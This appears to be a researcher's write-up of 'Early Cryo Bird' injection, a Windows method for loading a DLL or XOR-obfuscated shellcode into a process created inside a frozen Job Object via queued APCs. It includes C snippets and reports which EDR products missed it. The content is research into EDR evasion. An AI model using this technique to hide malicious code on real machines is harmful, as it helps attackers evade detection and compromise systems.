# 🧊 Early Cryo Bird Injections - APC-based DLL & Shellcode Injection via Pre-Frozen Job Objects

## Table of Contents

- [Introduction](##introduction)
- [Theoretical Foundations](##theoretical-foundations)
  - [Windows Job Objects](###windows-job-objects)
  - [Asynchronous Procedure Calls (APC)](###asynchronous-procedure-calls-apc)
  - [QueueUserAPC](###QueueUserAPC)
  - [Early Bird Injection](###EarlyBirdInjection)
- [Early Cryo Bird Injection via Pre-Frozen Process in a Job Object](#EarlyCryoBirdInjectionviaPre-FrozenProcessinaJobObject)
  - [DLL Injection](##early-cryo-bird-dll-injection)
  - [Shellcode Injection](##early-cryo-bird-shellcode-injection)
- [Detection & EDR Evaluation](#early-bird-cryo-injections-versus-edrs)
- [Conclusion](#Conclusion)
- [References](#References)


## 📘 Introduction

After my initial work with Windows Job Objects and the possibility of freezing a process in an alternative way, I wrote a new paper to explore these topics in more depth and have summarized them here. It’s quite a lot of content, and I initially planned to build a multi-part series but then I decided to compile everything into one single paper and just publish it.

**Process Injection** is a widely used technique to execute malicious code within the context of a legitimate process without being detected. Common methods such as **Early Bird Injection**, **APC Injection**, or **Thread Hijacking** are frequently employed, but are increasingly detected and blocked by modern security mechanisms.

This paper introduces an additional technique called **"Early Cryo Bird Injections"** plural, because it includes not only **shellcode injection**, but also **DLL injection**. This method leverages an undocumented Windows function based on **Windows Job Objects**, which allows a process to be frozen without requiring suspicious flags like **CREATE_SUSPENDED** or **DEBUG_PROCESS**. The goal was to bypass **Endpoint Detection and Response (EDR)** solutions. The approach combines **process freezing ("Cryo") via Job Objects**, which create the process already in a frozen state and uses **Asynchronous Procedure Calls (APC)**, in order to discreetly inject malicious code or load a DLL into the target process.

During the development phase, it became clear that **Cortex**, using a **YARA rule**, monitors memory page transitions from **RW (Read-Write)** to **RX (Read-Execute)**. Despite multiple attempts to bypass this detection using different memory protection strategies (Code Caves), the approach remained detectable. As a result, I decided to additionally implement **DLL injection via APC** into the frozen process.

In the second part of my series, I will present further findings and dive deeper into the technical details of this method.


## 🧠 Theoretical Foundations


### 📦 Windows Job Objects

Windows Job Objects are specialized kernel-level constructs that allow multiple processes to be grouped together and managed as a single unit. This capability is particularly useful in scenarios where:

- All child processes of a tool (e.g., during a build process) need to be started, constrained, or terminated collectively.
- A server process must impose resource limits on requests from individual clients.
- Processes are to be executed within a controlled, sandbox-like environment.

> 💡 **Note:** By default, Windows does not maintain a strict parent-child relationship between processes, a child process can continue executing even if its parent terminates. Job Objects effectively address this limitation by enforcing group-based process control.


### 🧵 Asynchronous Procedure Calls (APC)

An APC (Asynchronous Procedure Call) is a function that is executed asynchronously in the context of a specific thread. When an APC is added to a thread, the system triggers a software interrupt, which executes the APC function during the next scheduling of that thread. For this to work, the thread must be in a so-called "alertable state," which can be achieved through API calls such as `SleepEx` or `WaitForSingleObjectEx`. One could say that APCs are the "Post-It notes" of the operating system, reminding threads: "Hey, don't forget to execute this!"


### 📥 QueueUserAPC

The Windows API function `QueueUserAPC` allows adding a user-mode APC to the queue of a thread:

```c
DWORD QueueUserAPC(
  PAPCFUNC pfnAPC,
  HANDLE hThread,
  ULONG_PTR dwData
);
```

### 🐦 Early Bird Injection

Early Bird Injection creates processes in a suspended state using flags such as `CREATE_SUSPENDED` or `DEBUG_PROCESS`, allowing preparation of the target process before it starts running. However, it has become well-known to many EDR solutions and is now considered an "old hat."




# 🚀 Early Cryo Bird Injection via Pre-Frozen Process in a Job Object

## 💉 Early Cryo Bird DLL-Injection 

The presented technique introduces a DLL injection that leverages **undocumented Windows internals**, specifically the **freezing capabilities of Windows Job Objects** via the `NtSetInformationJobObject` API in combination with the `JOBOBJECT_FREEZE_INFORMATION` structure. In contrast to conventional injection strategies that rely on `CREATE_SUSPENDED` or `DEBUG_PROCESS` flags, often flagged by Endpoint Detection and Response (EDR) systems. This method enables control of process execution through job-level manipulation.

By creating a target process directly within a pre-frozen Job Object, memory operations such as allocation and writing of a **DLL path** can be performed while the process remains inactive, thus minimizing detectable behavioral anomalies. The DLL is subsequently loaded via a **queued Asynchronous Procedure Call (APC)** targeting the `LoadLibraryA` function. Once the process is "thawed" by resetting the freeze state, the APC is executed, and the DLL is injected and initialized within the target context.

## 🎯 **Key Advantages:**

- Utilizes **native NT system calls**, bypassing higher-level, monitored API layers
- **Eliminates the need for classical suspension flags**, reducing visibility to EDR solutions
- Offers **precise execution control** through Job-based process freezing and thawing
- **Supports both DLL and shellcode injection** payloads

## 🧩 **Step-by-Step Breakdown**

### **1. Create Job Object**
A new, empty Job Object is created using `CreateJobObjectW`. This object acts as a container for the target process and allows fine-grained control over its execution.
### **2. Enable Freeze Behavior**  
The job is configured via `NtSetInformationJobObject` with `JOBOBJECT_FREEZE_INFORMATION`, which sets the `Freeze` flag to `TRUE`.
### **3. Initialize Attribute List**
The `STARTUPINFOEXW` structure is prepared, and an attribute list (`PROC_THREAD_ATTRIBUTE_LIST`) is allocated to support extended process creation attributes.
### **4. Bind Job to Attributes**
The Job Object is linked to the attribute list using `UpdateProcThreadAttribute`. This ensures that any process created with this attribute list is automatically assigned to the Job upon creation.
### **5. Create Target Process in a Frozen Job**
The target process (e.g., `dllhost.exe`) is created using `CreateProcessW` with the `EXTENDED_STARTUPINFO_PRESENT` flag. It starts inside the job in a frozen state.
### **6. Allocate Memory in Target**
Memory is allocated using `NtAllocateVirtualMemoryEx` for storing the DLL path.
### **7. Write DLL Path into Memory**
The path to the DLL is written to the allocated region via `NtWriteVirtualMemory`.
### **8. Queue APC for LoadLibraryW**
An APC is queued in the primary thread using `NtQueueApcThread`. The callback is `LoadLibraryW`, and the DLL path is passed as an argument.
### **9. Unfreeze/Thaw the Process**
Using `NtSetInformationJobObject`, the freeze is lifted (`Freeze = FALSE`).
### **10. APC Executes → DLL is Loaded**
Once the process enters an alertable state, the APC is executed, resulting in DLL injection and execution.

### 🔄 Injection Flow:

![e93c1b79f5a291a0e4caf7165337d109_MD5](https://github.com/user-attachments/assets/668707e2-669c-4041-998c-64988612a3d0)


### ⚙️ Some Technical Implementation

#### ❄️🧊 Job-Create and Freezing:


```c
NTSTATUS creationJob = NtCreateJobObject(&hJob, STANDARD_RIGHTS_ALL | 63, NULL);
 if (!NT_SUCCESS(creationJob)) {
     SetColor(FOREGROUND_RED);
     printf("Error: 0x%X\n", creationJob);
     CloseHandle(hJob);
     return -1;
 }


 JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
 freezeInfo.FreezeOperation = 1; // Initiate freeze
 freezeInfo.Freeze = TRUE;

 NTSTATUS freezeStatus = NtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, &freezeInfo, sizeof(freezeInfo));
 if (!NT_SUCCESS(freezeStatus)) {
     SetColor(FOREGROUND_RED);
     printf("Error: 0x%X\n", freezeStatus);
     CloseHandle(hJob);
     return -1;
 }
```


#### 🚫 Process Creation Without Flags


```c
// Create process in the job (e.g. dllhost.exe)
PROCESS_INFORMATION pi = { 0 };
if (!CreateProcessW(
    L"C:\\Windows\\System32\\dllhost.exe",
    NULL,
    NULL,
    NULL,
    FALSE,
    EXTENDED_STARTUPINFO_PRESENT,
    NULL,
    NULL,
    &siEx.StartupInfo,
    &pi))
{
    std::cerr << "CreateProcessW failed: " << GetLastError() << std::endl;
    DeleteProcThreadAttributeList(siEx.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
    CloseHandle(hJob);
    return -1;
}
std::cout << "[+] Started Process in Job! PID: " << pi.dwProcessId << std::endl;

// Release attribute list
DeleteProcThreadAttributeList(siEx.lpAttributeList);
HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
```


#### 📬🧵 NtQueueApcThread (QueueUserAPC)


```c
HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
if (hKernel32 == NULL) {
    SetColor(FOREGROUND_RED);
    printf("[-] Error retrieving Kernel32-Module\n");
    CloseHandle(hJob);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return -1;
}


FARPROC loadLibAddr = GetProcAddress(hKernel32, pAddress);
if (!loadLibAddr) {
    printf("Error retrieving the address of LoadLibraryW.\n");
    CloseHandle(hJob);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return -1;
}
if (!NT_SUCCESS(NtQueueApcThread(pi.hThread, (PVOID)loadLibAddr, remoteMemory, NULL, NULL))) {
    printf("NtQueueApcThread failed...\n");
    CloseHandle(hJob);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return -1;
}
SetColor(FOREGROUND_INTENSITY);
printf("[+] APC has been successfully installed. The DLL is loaded during defrosting.\n");
```


#### 🔓🔥 Job-Thawing


```c
freezeInfo.FreezeOperation = 1; // Unfreeze operation
freezeInfo.Freeze = FALSE;


NTSTATUS unfreezeStatus = NtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, &freezeInfo, sizeof(freezeInfo));
if (!NT_SUCCESS(unfreezeStatus)) {
    SetColor(FOREGROUND_RED);
    printf("Error: 0x%X\n", unfreezeStatus);
    CloseHandle(hJob);
    return -1;
}
```


### 🎥 Proof of Concept

![Screenshot 2025-04-04 203016](https://github.com/user-attachments/assets/66c2bde6-f1c6-4d3e-bccd-52b5e21bfbf0)

### ⚖️ Differences between Frozen Process and Suspended Process


##### 🧵 Threads


![DLL_Injection_New_Thread](https://github.com/user-attachments/assets/cbd36e04-7124-4455-82a8-5efa3a6de3b2)


##### ⏱️ Time


![DLL_Injection_New_Statistics(RunningTime)](https://github.com/user-attachments/assets/25ca405e-df41-40d5-8ffd-8ccb29e682a2)


##### 📦 Loaded Modules


![DLL_Injection_New_Modules](https://github.com/user-attachments/assets/ccccbddb-f52a-49d5-9649-7cd517b17038)


## 💉🐚 Early Cryo Bird Shellcode Injection


As previously mentioned, APCs can also be used for shellcode injection. In my implementation, the process closely mirrors that of a conventional injection. The first six steps are identical to those in the DLL injection variant, the only difference is that instead of writing a DLL path into a memory page, shellcode is written -> in my case, XOR-obfuscated shellcode. 

Afterwards, the memory page’s protection is changed to RX (read/execute) to grant execution rights before queuing it as an APC. Interestingly, because the process is frozen when the APC is queued, the shellcode is only executed once the process is thawed and the APCs are processed. There are several ways to leverage APCs at the native level; for example, NtQueueApcThreadEx even allows an APC to be executed on a thread that is normally non-alterable.


### ⚠️➡️ APC Injection Before Thawing


```c
PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)hVirtualAlloc;
 NTSTATUS statusAPC = NtQueueApcThread(pi.hThread, (PVOID)apcRoutine, NULL, NULL, NULL);

 if (!NT_SUCCESS(statusAPC)) {
     SetColor(FOREGROUND_RED);
     printf("\t[!] NtQueueApcThread Failed With Error : 0x%X \n", statusAPC);
     return FALSE;
 }
 else {
     SetColor(FOREGROUND_GREEN);
     printf("[+] NtQueueApcThread successfully queued APC\n");
 }
```


### 🎥 Proof of Concept

![Screenshot 2025-04-04 203753](https://github.com/user-attachments/assets/e24bb8bc-5187-4e80-83bd-0fd9caf55feb)


# ⚔️🛡️ Early Bird Cryo Injections vs EDRs


Now we’re getting to the part that most people are probably interested in: **Early Cryo technique versus various EDRs**. Before diving in, I’d like to point out that both the DLL and shellcode injection variants dynamically resolve Windows APIs, make use of native NT functions, and specifically in the shellcode variant leverage a **XOR-obfuscated payload**. I’ll keep this section brief, as a deep technical breakdown would go beyond the scope of this summary.

I tested both techniques against three different EDR solutions:

- **Microsoft Defender ATP**
- **Cortex XDR**
- **Trend Vision One**



## 🛡️ Defender ATP

Surprisingly, Defender ATP did not trigger any alerts during testing. While it did observe certain memory-related activities during the shellcode injection (e.g., memory allocation), it didn’t classify them as suspicious. The DLL injection, on the other hand, appeared completely normal to Defender— no anomalies, no incidents.

It's worth noting that an incident **can** occur if you use processes like `dllhost.exe` to spawn `cmd.exe` and execute commands such as `whoami`, depending on the behavior and context.

Overall, Defender seems largely unaffected and captures very little in this scenario.



![b84aec4f368613c4ac413f57f7916e76_MD5](https://github.com/user-attachments/assets/2e2e7186-945f-40ae-a639-6da741f685bf)



## 🔬 Cortex XDR

Cortex performed significantly better in comparison. In most cases, it triggered at least one incident and actively blocked the malware, particularly in the shellcode injection scenario. The DLL injection was the only method that, under certain conditions, managed to slip through. That’s also the reason the DLL injection variant was developed in combination with the freeze-and-thaw technique.

Cortex's behavioral detection is very solid. With enough experimentation and evasion techniques, it might be possible to bypass it, but that would require more effort. While the DLL injection caused only a single detection, the shellcode variant led to multiple alerts.

**DLL-Injection:**
![a3a69ba3d396e0406e8b21bd2c0cd843_MD5](https://github.com/user-attachments/assets/1a4e3387-19e7-48ab-940a-9d86f461dc4d)

![ae2e44c3e002d5c2f3383ca7b8364e37_MD5](https://github.com/user-attachments/assets/beedc999-ed0c-4a8a-92fc-17335fa5fb13)

**Shellcode Injection**

![73ffb00335f7e673bb461d709d88a2ce_MD5](https://github.com/user-attachments/assets/c484a41a-a6d8-4c64-818f-14fec1821f53)

## 👻 Trend Vision One

Trend Vision One behaved similarly to Defender ATP **no detections** were triggered for either injection method. Both techniques went completely unnoticed.

**DLL-Injection:**
![trend2](https://github.com/user-attachments/assets/3f1765fc-3ee3-4517-987b-5258ccb7cfc6)

**Shellcode Injection:**
![Trend1](https://github.com/user-attachments/assets/414be52b-2cf4-46e1-9dfe-90e4278dcc26)


# 🧠 Conclusion

I know many of you might say, "Wow, he’s just using a few things differently." But that’s the beauty of it, right? There’s still so much that can be combined and developed into new techniques, isn’t there? I mean, there’s even another native function that allows direct execution of an APC on a non-alertable thread!

In the end, the goal was to dive deeper into APC as part of the learning process and see what works and what doesn’t. I hope I was able to spark some thoughts or ideas among some of you.

I’m now moving on to the third project of the trilogy, where I will continue to explore Job Freeze/Thaw mechanisms to create some cool stuff. Just a little hint: They exist in the anime series _Bleach_ (Hollows).


# 📚 References

[1] https://learn.microsoft.com/

[2] https://ntdoc.m417z.com/


[3] https://github.com/winsiderss/systeminformer


[4] https://github.com/3gstudent/


[5] https://maldevacademy.com/


[6] Programming Windows - Charles Petzold


[7] Windows via C/C++, Fifth Edition - Jeffrey Richter and Christophe Nasarre


[8] https://scorpiosoftware.net/2024/07/24/what-can-you-do-with-apcs/ (Pavel Yosifovich)
